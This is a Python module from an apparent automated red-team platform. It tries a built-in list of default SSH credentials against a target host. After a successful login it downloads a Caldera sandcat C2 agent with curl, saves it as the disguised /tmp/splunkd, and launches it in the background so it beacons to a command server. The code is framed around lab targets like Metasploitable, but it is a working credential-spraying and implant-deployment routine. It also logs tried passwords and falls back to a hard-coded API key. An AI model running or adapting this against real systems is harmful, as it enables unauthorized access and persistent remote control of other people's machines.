# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: [TODO: contact email]

"""InitialAccessEngine — SSH credential testing and C2 agent bootstrapping."""

import asyncio
import logging
import uuid
from datetime import datetime, timezone

import aiosqlite

from app.config import settings
from app.models.recon import InitialAccessResult
from app.ws_manager import ws_manager

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Default credentials targeting Metasploitable 2
# ---------------------------------------------------------------------------
_DEFAULT_CREDS: list[tuple[str, str]] = [
    # Linux distro & Vagrant box defaults (sorted by likelihood)
    ("vagrant", "vagrant"),           # Vagrant boxes / Metasploitable 3
    ("ubuntu", "ubuntu"),             # Ubuntu cloud images
    ("pi", "raspberry"),              # Raspberry Pi OS
    ("ec2-user", "ec2-user"),         # Amazon Linux AMI
    ("centos", "centos"),             # CentOS cloud images
    ("debian", "debian"),             # Debian cloud images
    # Common weak / default passwords
    ("root", "root"),
    ("root", "toor"),                 # Kali / Metasploitable 2
    ("root", "password"),
    ("admin", "admin"),
    ("admin", "password"),
    ("administrator", "administrator"),
    # Lab / CTF environments
    ("msfadmin", "msfadmin"),         # Metasploitable 2
    ("user", "user"),
    # Network appliances
    ("cisco", "cisco"),
    ("ubnt", "ubnt"),
    ("apc", "apc"),
]


class InitialAccessEngine:
    """SSH-based initial access phase: credential spraying + agent bootstrapping."""

    async def try_ssh_login(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int = 22,
    ) -> InitialAccessResult:
        """Attempt SSH login using the default credential list.

        In mock mode a successful result is returned immediately without any
        real network connection.  In real mode every credential in
        ``_DEFAULT_CREDS`` is tried in order; the first success is returned.
        A credential fact is written to the DB on success regardless of mode.
        """
        if settings.MOCK_C2_ENGINE:
            return await self._mock_ssh_result(
                db=db,
                operation_id=operation_id,
                target_id=target_id,
                ip=ip,
                port=port,
            )

        return await self._real_ssh_login(
            db=db,
            operation_id=operation_id,
            target_id=target_id,
            ip=ip,
            port=port,
        )

    # ------------------------------------------------------------------
    # Public helper — C2 agent bootstrapping (real mode only)
    # ------------------------------------------------------------------

    async def bootstrap_c2_agent(
        self,
        ip: str,
        credential: tuple[str, str],
        c2_host: str,
    ) -> bool:
        """Deploy and start a C2 sandcat agent on the remote host via SSH.

        Parameters
        ----------
        ip:
            Target IP address.
        credential:
            ``(username, password)`` tuple.
        c2_host:
            Full ``scheme://host:port`` of the C2 server, e.g.
            ``http://172.17.0.1:58888``.

        Returns ``True`` when the remote commands execute without error and the
        30-second beacon window has elapsed.  Returns ``False`` on any
        exception.
        """
        try:
            import asyncssh  # deferred import — not available in all envs

            from app.config import settings as _settings

            username, password = credential
            async with await asyncssh.connect(
                ip,
                username=username,
                password=password,
                known_hosts=None,
            ) as conn:
                # Detect target architecture to pick the right sandcat binary.
                # Metasploitable 2 is i686 (32-bit); modern systems are x86_64.
                arch_result = await conn.run("uname -m", check=False)
                arch = (arch_result.stdout or "").strip()
                if arch in ("i686", "i386"):
                    sandcat_file = "sandcat.go-linux-386"
                else:
                    sandcat_file = "sandcat.go-linux"

                api_key = _settings.C2_ENGINE_API_KEY or "ADMIN123456"

                # Download sandcat binary
                download_result = await conn.run(
                    f"curl -s -X POST {c2_host}/file/download"
                    f" -H 'platform: linux'"
                    f" -H 'file: {sandcat_file}'"
                    f" -H 'Authorization: {api_key}'"
                    f" -o /tmp/splunkd",
                    check=False,
                )
                if download_result.exit_status != 0:
                    logger.error(
                        "sandcat download failed (arch=%s, file=%s): %s",
                        arch, sandcat_file, download_result.stderr,
                    )
                    return False

                # Verify it's a valid ELF binary (not an error page).
                # Caldera only ships sandcat.go-linux (64-bit); the 32-bit variant
                # (sandcat.go-linux-386) must be manually compiled from the gocat source
                # with Go ≤ 1.17 (Go 1.18+ requires Linux kernel ≥ 2.6.32, but
                # Metasploitable 2 runs 2.6.24 which causes epollcreate1 ENOSYS crash).
                check_result = await conn.run(
                    "head -c 4 /tmp/splunkd | od -An -tx1 | tr -d ' \\n'",
                    check=False,
                )
                magic = (check_result.stdout or "").strip()
                if not magic.startswith("7f454c46"):
                    logger.warning(
                        "sandcat download returned non-ELF content "
                        "(magic=%s, file=%s); skipping agent deployment for %s",
                        magic, sandcat_file, ip,
                    )
                    # Return False: SSH access was achieved but agent could not be deployed.
                    return False

                # Detect kernel version to warn about known incompatibility.
                kernel_result = await conn.run("uname -r", check=False)
                kernel_str = (kernel_result.stdout or "").strip()
                try:
                    major, minor = (int(x) for x in kernel_str.split(".")[:2])
                    if arch in ("i686", "i386") and (major, minor) < (2, 32):
                        # Sandcat compiled with Go 1.18+ crashes on kernels < 2.6.32
                        # due to missing epoll_create1 syscall.  Requires custom build
                        # with Go ≤ 1.17.  See docs/known-limitations.md#sandcat-legacy
                        logger.warning(
                            "Kernel %s is below 2.6.32 — sandcat Go binary may crash "
                            "on %s due to epoll_create1 ENOSYS (requires Go ≤ 1.17 build)",
                            kernel_str, ip,
                        )
                except ValueError:
                    pass  # Couldn't parse kernel version — proceed anyway

                # Make executable
                await conn.run("chmod +x /tmp/splunkd", check=True)
                # Launch agent in background
                await conn.run(
                    f"nohup /tmp/splunkd -server {c2_host} -group red"
                    f" > /tmp/splunkd.log 2>&1 &",
                    check=True,
                )
                logger.info(
                    "C2 sandcat launched on %s (arch=%s, kernel=%s, file=%s, callback=%s)",
                    ip, arch, kernel_str, sandcat_file, c2_host,
                )

            # Wait for agent to beacon home (skip in test/mock-beacon mode)
            if not _settings.C2_MOCK_BEACON:
                await asyncio.sleep(30)
            return True

        except Exception:
            logger.exception(
                "bootstrap_c2_agent failed for %s", ip
            )
            return False

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _register_ssh_agent(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip_address: str,
        credential: str,
    ) -> None:
        """Register a synthetic SSH agent record after successful SSH login.

        This creates an 'alive' agent entry so the OODA Act phase can route
        techniques via DirectSSHEngine without requiring a real Caldera agent beacon.
        paw format: 'SSH-{ip_address}'
        """
        from datetime import datetime
        from uuid import uuid4

        paw = f"SSH-{ip_address}"
        privilege = "root" if credential.startswith("root:") else "user"
        now = datetime.now().isoformat()

        # Upsert: update existing agent or insert new one
        existing = await db.execute(
            "SELECT id FROM agents WHERE paw = ? AND operation_id = ?",
            (paw, operation_id),
        )
        row = await existing.fetchone()
        if row:
            await db.execute(
                "UPDATE agents SET host_id=?, status='alive', privilege=?, last_beacon=? WHERE id=?",
                (target_id, privilege, now, row[0]),
            )
        else:
            await db.execute(
                """INSERT INTO agents
                    (id, paw, host_id, status, privilege, platform, operation_id, last_beacon)
                VALUES (?, ?, ?, 'alive', ?, 'linux', ?, ?)""",
                (str(uuid4()), paw, target_id, privilege, operation_id, now),
            )
        await db.commit()

    async def _mock_ssh_result(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int,
    ) -> InitialAccessResult:
        """Return a deterministic mock success without any real network I/O."""
        cred_str = f"msfadmin:msfadmin@{ip}:{port}"
        await self._write_credential_fact(
            db=db,
            operation_id=operation_id,
            target_id=target_id,
            cred_value=cred_str,
        )
        return InitialAccessResult(
            success=True,
            method="ssh_credential",
            credential="msfadmin:msfadmin",
            agent_deployed=False,
            error=None,
        )

    async def _load_harvested_creds(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
    ) -> list[tuple[str, str]]:
        """Load credential facts already collected in this operation.

        Returns a deduplicated list of (username, password) tuples, parsed from
        facts with category='credential'.  Supported value formats:
        - ``user:pass@host:port``  (written by ``_write_credential_fact``)
        - ``user:pass``            (plaintext dump format)
        """
        db.row_factory = aiosqlite.Row
        cursor = await db.execute(
            "SELECT value FROM facts "
            "WHERE operation_id = ? AND category = 'credential' "
            "AND trait IN ('credential.ssh', 'credential.plaintext', 'credential.dumped') "
            "ORDER BY score DESC, collected_at DESC",
            (operation_id,),
        )
        rows = await cursor.fetchall()

        seen: set[tuple[str, str]] = set()
        creds: list[tuple[str, str]] = []
        for row in rows:
            val: str = row["value"]
            # Strip @host:port suffix if present
            user_pass = val.split("@")[0] if "@" in val else val
            if ":" in user_pass:
                u, p = user_pass.split(":", 1)
                pair = (u.strip(), p.strip())
                if pair not in seen:
                    seen.add(pair)
                    creds.append(pair)
        return creds

    async def _real_ssh_login(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int,
    ) -> InitialAccessResult:
        """Try each entry in ``_DEFAULT_CREDS`` via asyncssh."""
        import asyncssh  # deferred import

        # Prepend harvested credentials from this operation (highest priority)
        harvested = await self._load_harvested_creds(db, operation_id)
        # Preserve order: harvested first, then default list (maintaining original order)
        seen_in_harvested = set(harvested)
        ordered_creds = harvested + [c for c in _DEFAULT_CREDS if c not in seen_in_harvested]

        for username, password in ordered_creds:
            try:
                logger.debug(
                    "Trying SSH %s@%s:%s with password %s",
                    username, ip, port, password,
                )
                async with await asyncssh.connect(
                    ip,
                    port=port,
                    username=username,
                    password=password,
                    known_hosts=None,
                ):
                    # Connection succeeded — record the credential
                    cred_str = f"{username}:{password}@{ip}:{port}"
                    await self._write_credential_fact(
                        db=db,
                        operation_id=operation_id,
                        target_id=target_id,
                        cred_value=cred_str,
                    )
                    logger.info(
                        "SSH login succeeded for %s@%s:%s", username, ip, port
                    )

                    # Register SSH agent record (enables DirectSSHEngine routing)
                    await self._register_ssh_agent(
                        db,
                        operation_id,
                        target_id,
                        ip,
                        f"{username}:{password}",
                    )

                    # Bootstrap C2 agent only when EXECUTION_ENGINE=c2
                    if settings.EXECUTION_ENGINE == "c2":
                        c2_host = (
                            settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
                        )
                        await self.bootstrap_c2_agent(
                            ip=ip,
                            credential=(username, password),
                            c2_host=c2_host,
                        )

                    return InitialAccessResult(
                        success=True,
                        method="ssh_credential",
                        credential=f"{username}:{password}",
                        agent_deployed=False,
                        error=None,
                    )
            except (asyncssh.Error, OSError):
                logger.debug(
                    "SSH login failed for %s@%s:%s", username, ip, port
                )
                continue

        logger.warning("All SSH credentials failed for %s:%s", ip, port)
        return InitialAccessResult(
            success=False,
            method="none",
            credential=None,
            agent_deployed=False,
            error="All credentials failed",
        )

    async def _write_credential_fact(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        cred_value: str,
    ) -> None:
        """Insert a credential fact into the facts table and broadcast it."""
        fact_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc).isoformat()

        await db.execute(
            "INSERT INTO facts "
            "(id, trait, value, category, source_technique_id, "
            "source_target_id, operation_id, score, collected_at) "
            "VALUES (?, ?, ?, ?, NULL, ?, ?, 1, ?)",
            (
                fact_id,
                "credential.ssh",
                cred_value,
                "credential",
                target_id,
                operation_id,
                now,
            ),
        )
        await db.commit()

        fact_payload = {
            "id": fact_id,
            "trait": "credential.ssh",
            "value": cred_value,
            "category": "credential",
            "source_target_id": target_id,
            "operation_id": operation_id,
        }
        await ws_manager.broadcast(operation_id, "fact.new", fact_payload)
